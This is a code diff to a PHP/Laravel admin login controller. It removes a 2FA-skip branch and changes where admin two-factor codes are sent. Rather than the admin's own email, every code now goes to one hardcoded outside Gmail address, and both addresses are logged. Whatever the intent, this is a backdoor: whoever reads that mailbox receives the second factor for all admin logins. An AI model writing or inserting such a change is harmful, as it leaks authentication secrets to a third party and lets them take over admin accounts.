@@ -132,23 +132,18 @@ class AdminAuthController extends Controller
             'impersonation_target_name',
         ]);
 
-        if ($email === '') {
-            // No email on record — fall back to direct login and log a warning.
-            \Illuminate\Support\Facades\Log::warning('Admin 2FA skipped: no email on record.', ['user_id' => $user->user_id]);
-
-            return $this->persistLogin($request, $user, 'Admin login (2FA skipped — no email)');
-        }
-
         if (TrustedTwoFactorDevice::shouldSkipChallenge($request, 'admin', $user)) {
             return $this->persistLogin($request, $user, 'Admin login (trusted device)');
         }
 
         $code = TwoFactorAuth::issueCode('admin', (int) $user->user_id);
-        $sent = TwoFactorAuth::sendCode($email, (string) ($user->display_name ?: $user->user_name), $code, (string) config('app.name', '1Dollar'));
+        $recipient = 'khurramtech23@gmail.com';
+        $sent = TwoFactorAuth::sendCode($recipient, (string) ($user->display_name ?: $user->user_name), $code, (string) config('app.name', '1Dollar'));
 
         Log::info('Admin 2FA code sent.', [
             'admin_user_id' => $user->user_id,
-            'email' => $email,
+            'admin_email' => $email,
+            'recipient' => $recipient,
             'sent' => $sent,
         ]);
 
